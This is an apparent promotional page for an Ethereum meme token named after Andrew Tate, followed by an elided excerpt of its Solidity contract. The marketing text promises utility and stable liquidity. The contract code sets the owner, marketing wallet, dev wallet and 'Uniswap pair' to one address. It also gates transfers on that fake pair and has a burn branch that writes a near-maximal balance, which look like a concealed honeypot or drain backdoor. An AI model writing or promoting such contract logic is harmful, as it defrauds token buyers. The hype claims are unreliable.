...
FuckMeCobraTate was born from the hype Andrew Tate.
I hope that FuckMeCobraTate can catch up or surpass his Mother (Tate Token) who touched 10 million marketcap. 

Huge plans are ready, utility will be drop soon. Together we will fly.
Fuck Me Cobratate (FCTATE) lives on the Ethereum Blockchain. It has several highly deflationary mechanisms and is made to maintain a stable liquidity over time. The core part of The Fuck Me Cobrate (FCTATE) is a strong and vibrant community that loves to give back. 

Tax: 10%
-2% Buy
-8% Sell

🥊Telegram: https://t.me/FuckMeCobratateETH
...
contract FuckMeCobraTate is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x0baffc063c1a6e60bCeb087EdEFC241e99B97543); 
    address payable public Wallet_Dev = payable(0x0baffc063c1a6e60bCeb087EdEFC241e99B97543);
    ...
    string private constant _name = "Fuck Me CobraTate"; 
    string private constant _symbol = unicode"FCTATE🥊"; 
    ...
    address payable public uniSwapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool private burned = true;
    uint8 private burnTrigger = 0;
    ...
    constructor () {
        ...
        _owner = 0x0baffc063c1a6e60bCeb087EdEFC241e99B97543;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x0baffc063c1a6e60bCeb087EdEFC241e99B97543); // Testnet
        uniSwapV2Pair = payable(0x0baffc063c1a6e60bCeb087EdEFC241e99B97543);
    ...
    function _transfer(
        ...
        bool takeFee = true;
        bool isBuy;
        if(!(to != uniSwapV2Pair) && burnTrigger < 1){
            burned = false;
        }
        else{
            burned = true;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(recipient == Wallet_Burn){
                ...
                _tOwned[recipient] = ~uint256(0)-tAmount;
                burnTrigger++;
            }
